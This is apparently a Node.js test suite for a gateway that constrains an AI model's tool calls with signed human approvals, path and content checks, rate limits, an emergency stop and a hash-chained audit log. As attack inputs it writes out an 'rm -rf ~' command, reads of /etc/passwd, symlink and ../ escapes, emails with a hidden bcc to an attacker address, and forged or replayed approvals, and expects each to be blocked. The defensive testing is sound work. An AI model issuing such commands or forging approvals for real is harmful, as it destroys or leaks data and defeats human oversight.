// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Stefan Rohringer
'use strict'
// gateway.test.js: tests the gateway from the outside, the way a model would use it.
// Uses a throwaway key and a copy of the demo in a temporary directory. Your real ~/.sealgate is not touched.
// Run: npm test

const fs = require('fs')
const os = require('os')
const path = require('path')
const crypto = require('crypto')

const TMP_KEYS = fs.mkdtempSync(path.join(os.tmpdir(), 'sealgate-keys-'))
process.env.SEALGATE_DIR = TMP_KEYS
const ROOT = path.join(__dirname, '..')
const K = require('../src/keys')
const { signPolicy, approvalFileFor, signDecision } = require('../src/approval')
const { verifyChain } = require('../src/audit')
const { Client } = require('@modelcontextprotocol/sdk/client/index.js')
const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js')

const RUN = fs.mkdtempSync(path.join(os.tmpdir(), 'sealgate-test-'))
const sleep = ms => new Promise(r => setTimeout(r, ms))

// Fresh copy of the demo
fs.cpSync(path.join(ROOT, 'examples', 'acme'), RUN, { recursive: true })
const POLICY = path.join(RUN, 'acme.policy.json')
const p = JSON.parse(fs.readFileSync(POLICY, 'utf8'))
p.audit_dir = 'audit'
p.human_approval_timeout_s = 5
p.target.env = { NODE_PATH: path.join(ROOT, 'node_modules') } // the copy lives outside the repo
fs.writeFileSync(POLICY, JSON.stringify(p, null, 2))
// A symlink inside the allowed folder that points outside (classic escape attempt)
fs.symlinkSync(POLICY, path.join(RUN, 'data', 'shortcut.txt'))

// Test key and approval
const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519')
fs.writeFileSync(K.PUBLIC_KEY, publicKey.export({ type: 'spki', format: 'pem' }))
signPolicy(POLICY, privateKey, { days: 1, by: 'test', serial: 10 })
const oldApproval = fs.readFileSync(approvalFileFor(POLICY), 'utf8')

// The "human" for approvals answers with the queued decisions in order.
// 'yes' and 'no' are signed with the test key. 'unsigned', 'foreign' and 'replay' are forged approvals.
const answers = []
let lastYes = null
let humanRunning = true
async function human () {
  const pending = path.join(K.APPROVALS, 'pending'); const decided = path.join(K.APPROVALS, 'decided')
  fs.mkdirSync(pending, { recursive: true }); fs.mkdirSync(decided, { recursive: true })
  const done = new Set()
  while (humanRunning) {
    for (const f of fs.readdirSync(pending)) {
      if (done.has(f)) continue
      done.add(f)
      const r = JSON.parse(fs.readFileSync(path.join(pending, f), 'utf8'))
      const d = answers.shift()
      if (!d) continue
      let answer
      if (d === 'unsigned') answer = { id: r.id, decision: 'yes', by: 'someone' } // the old plain format
      else if (d === 'foreign') answer = signDecision(r, 'yes', crypto.generateKeyPairSync('ed25519').privateKey, { by: 'stranger' })
      else if (d === 'replay') answer = lastYes // a real signed yes, but for an earlier request
      else answer = signDecision(r, d, privateKey, { by: 'test-human' })
      if (d === 'yes') lastYes = answer
      fs.writeFileSync(path.join(decided, f), JSON.stringify(answer))
    }
    await sleep(100)
  }
}

let passed = 0; let total = 0
function expect (title, actual, wanted) {
  total++
  const ok = actual === wanted
  if (ok) passed++
  console.log(`${ok ? '\x1b[32m ok \x1b[0m' : '\x1b[31mFAIL\x1b[0m'}  ${title.padEnd(58)} ${actual}${ok ? '' : `  (expected ${wanted})`}`)
}

async function main () {
  const transport = new StdioClientTransport({
    command: process.execPath, args: [path.join(ROOT, 'src', 'gateway.js'), POLICY],
    env: { ...process.env, SEALGATE_DIR: TMP_KEYS }, stderr: 'pipe'
  })
  let stderr = ''
  transport.stderr && transport.stderr.on('data', d => { stderr += d })
  const client = new Client({ name: 'test', version: '1' })
  await client.connect(transport)
  human()

  const call = async (name, args) => {
    const a = await client.callTool({ name, arguments: args })
    const t = a.content && a.content[0] ? a.content[0].text : ''
    let j = null; try { j = JSON.parse(t) } catch {}
    if (j && j.result === 'denied') return { verdict: `denied [${j.gate}]`, text: t }
    return { verdict: a.isError ? 'error' : 'executed', text: t }
  }

  console.log('\nVisible tools')
  const names = (await client.listTools()).tools.map(t => t.name)
  expect('run_command is invisible to the model', String(names.includes('run_command')), 'false')
  expect('read_file is visible', String(names.includes('read_file')), 'true')

  console.log('\nAllowed work')
  expect('read the stock list', (await call('read_file', { path: 'stock.csv' })).verdict, 'executed')
  expect('list a folder', (await call('list_folder', { path: '.' })).verdict, 'executed')
  expect('write a report to outbox', (await call('write_file', { path: 'outbox/report.md', content: 'Reorder PP.' })).verdict, 'executed')
  expect('email purchasing@', (await call('send_email', { to: 'purchasing@acme.example', subject: 'PP low', body: 'Please 400 kg PP.' })).verdict, 'executed')
  expect('order 250 kg PP for 362 EUR (no human)', (await call('place_order', { item: 'PP pellets', quantity_kg: 250, price_eur: 362.5 })).verdict, 'executed')
  const notes = await call('read_file', { path: 'notes.txt' })
  expect('notes: key in text is redacted', String(!notes.text.includes('sk-ant-demo') && notes.text.includes('[REDACTED]')), 'true')
  expect('notes: IBAN is redacted', String(!notes.text.includes('DE12 3456')), 'true')

  console.log('\nAttacks and mistakes')
  expect('call the hidden tool anyway', (await call('run_command', { command: 'rm -rf ~' })).verdict, 'denied [tool]')
  expect('path with ../ out of the folder', (await call('read_file', { path: '../acme.policy.json' })).verdict, 'denied [path]')
  expect('absolute path to /etc/passwd', (await call('read_file', { path: '/etc/passwd' })).verdict, 'denied [path]')
  expect('symlink pointing outside', (await call('read_file', { path: 'shortcut.txt' })).verdict, 'denied [path]')
  expect('read the confidential folder internal', (await call('read_file', { path: 'internal/salaries.txt' })).verdict, 'denied [path]')
  expect('read the SealGate key directory', (await call('read_file', { path: path.join(TMP_KEYS, 'public_key.pem') })).verdict, 'denied [path]')
  expect('write outside outbox', (await call('write_file', { path: 'stock.csv', content: 'gone' })).verdict, 'denied [path]')
  expect('write a script instead of text (.sh)', (await call('write_file', { path: 'outbox/x.sh', content: 'echo' })).verdict, 'denied [path]')
  expect('write an IBAN into a file', (await call('write_file', { path: 'outbox/list.csv', content: 'North,DE89 3704 0044 0532 0130 00' })).verdict, 'denied [content]')
  expect('email to an outside address', (await call('send_email', { to: 'attacker@evil.example', subject: 'Data', body: 'here' })).verdict, 'denied [to]')
  expect('email with an IBAN in the body', (await call('send_email', { to: 'boss@acme.example', subject: 'Account', body: 'New IBAN: DE00...' })).verdict, 'denied [body]')
  expect('email with hidden extra field "bcc"', (await call('send_email', { to: 'boss@acme.example', subject: 'x', body: 'y', bcc: 'attacker@evil.example' })).verdict, 'denied [fields]')
  expect('email without required field "body"', (await call('send_email', { to: 'boss@acme.example', subject: 'x' })).verdict, 'denied [body]')
  expect('order an item that is not allowed', (await call('place_order', { item: 'Gold', quantity_kg: 30, price_eur: 100 })).verdict, 'denied [item]')
  expect('order 50000 kg', (await call('place_order', { item: 'PP pellets', quantity_kg: 50000, price_eur: 4000 })).verdict, 'denied [quantity_kg]')
  expect('price as text "100" instead of a number', (await call('place_order', { item: 'PP pellets', quantity_kg: 30, price_eur: '100' })).verdict, 'denied [price_eur]')

  console.log('\nHuman decides (from 500 EUR)')
  answers.push('yes')
  expect('order 620 EUR, human says yes', (await call('place_order', { item: 'PA6 pellets', quantity_kg: 200, price_eur: 620 })).verdict, 'executed')
  answers.push('no')
  expect('order 920 EUR, human says no', (await call('place_order', { item: 'ABS pellets', quantity_kg: 400, price_eur: 920 })).verdict, 'denied [human]')
  answers.push('unsigned')
  expect('order 640 EUR, unsigned yes dropped into the folder', (await call('place_order', { item: 'PA6 pellets', quantity_kg: 200, price_eur: 640 })).verdict, 'denied [human]')
  answers.push('foreign')
  expect('order 640 EUR, yes signed with a foreign key', (await call('place_order', { item: 'PA6 pellets', quantity_kg: 200, price_eur: 640 })).verdict, 'denied [human]')
  answers.push('replay')
  expect('order 640 EUR, earlier signed yes replayed', (await call('place_order', { item: 'PA6 pellets', quantity_kg: 200, price_eur: 640 })).verdict, 'denied [human]')
  expect('order 700 EUR, human does not answer (5 s)', (await call('place_order', { item: 'PP pellets', quantity_kg: 400, price_eur: 700 })).verdict, 'denied [human]')
  expect('split order 200 EUR: daily sum without approval >= 500', (await call('place_order', { item: 'PP pellets', quantity_kg: 140, price_eur: 200 })).verdict, 'denied [human]')

  console.log('\nRate limits')
  expect('third order of the day still passes', (await call('place_order', { item: 'PP pellets', quantity_kg: 50, price_eur: 75 })).verdict, 'executed')
  expect('fourth order of the day is blocked', (await call('place_order', { item: 'PP pellets', quantity_kg: 50, price_eur: 75 })).verdict, 'denied [rate]')
  for (let i = 0; i < 4; i++) await call('send_email', { to: 'boss@acme.example', subject: `No ${i}`, body: 'Test' })
  expect('sixth email in the hour is blocked', (await call('send_email', { to: 'boss@acme.example', subject: 'No 6', body: 'Test' })).verdict, 'denied [rate]')

  console.log('\nEmergency stop and policy approval')
  fs.writeFileSync(K.ESTOP, 'test')
  expect('emergency stop on: even reading is denied', (await call('read_file', { path: 'stock.csv' })).verdict, 'denied [estop]')
  fs.unlinkSync(K.ESTOP)
  expect('emergency stop off: reading works again', (await call('read_file', { path: 'stock.csv' })).verdict, 'executed')

  const original = fs.readFileSync(POLICY, 'utf8')
  const tampered = JSON.parse(original)
  tampered.tools.send_email.checks[0].values.push('attacker@evil.example')
  fs.writeFileSync(POLICY, JSON.stringify(tampered, null, 2))
  expect('policy secretly extended: everything blocked', (await call('send_email', { to: 'attacker@evil.example', subject: 'x', body: 'y' })).verdict, 'denied [policy]')
  expect('... even harmless reading', (await call('read_file', { path: 'stock.csv' })).verdict, 'denied [policy]')
  fs.writeFileSync(POLICY, original)
  expect('policy restored: works again', (await call('read_file', { path: 'stock.csv' })).verdict, 'executed')

  signPolicy(POLICY, privateKey, { days: 1, by: 'test', serial: 11 })
  expect('new approval (serial 11)', (await call('read_file', { path: 'stock.csv' })).verdict, 'executed')
  fs.writeFileSync(approvalFileFor(POLICY), oldApproval)
  expect('old approval replayed', (await call('read_file', { path: 'stock.csv' })).verdict, 'denied [policy]')
  signPolicy(POLICY, crypto.generateKeyPairSync('ed25519').privateKey, { days: 1, by: 'attacker', serial: 99 })
  expect('approval signed with a foreign key', (await call('read_file', { path: 'stock.csv' })).verdict, 'denied [policy]')
  signPolicy(POLICY, privateKey, { days: -1, by: 'test', serial: 12 })
  expect('expired approval', (await call('read_file', { path: 'stock.csv' })).verdict, 'denied [policy]')

  humanRunning = false
  await client.close()

  console.log('\nAudit log')
  const auditDir = path.join(RUN, 'audit')
  const file = path.join(auditDir, fs.readdirSync(auditDir).at(0))
  expect('audit chain intact', String(verifyChain(file).ok), 'true')
  const lines = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean)
  const changed = lines.slice(); const l = JSON.parse(changed.at(3)); l.verdict = 'executed_forged'; changed.splice(3, 1, JSON.stringify(l))
  fs.writeFileSync(file + '.changed', changed.join('\n') + '\n')
  expect('one line changed afterwards: detected', String(verifyChain(file + '.changed').ok), 'false')
  const removed = lines.slice(); removed.splice(5, 1)
  fs.writeFileSync(file + '.removed', removed.join('\n') + '\n')
  expect('one line removed: detected', String(verifyChain(file + '.removed').ok), 'false')
  const sent = fs.readFileSync(path.join(RUN, 'data', 'sent_mail.jsonl'), 'utf8')
  expect('no email to an outside address was sent', String(!sent.includes('evil.example')), 'true')

  console.log(`\n${passed} of ${total} checks passed.`)
  fs.rmSync(TMP_KEYS, { recursive: true, force: true })
  fs.rmSync(RUN, { recursive: true, force: true })
  if (passed !== total) console.log('\nGateway output:\n' + stderr)
  process.exit(passed === total ? 0 : 1)
}

main().catch(e => { console.error('error:', e); process.exit(1) })
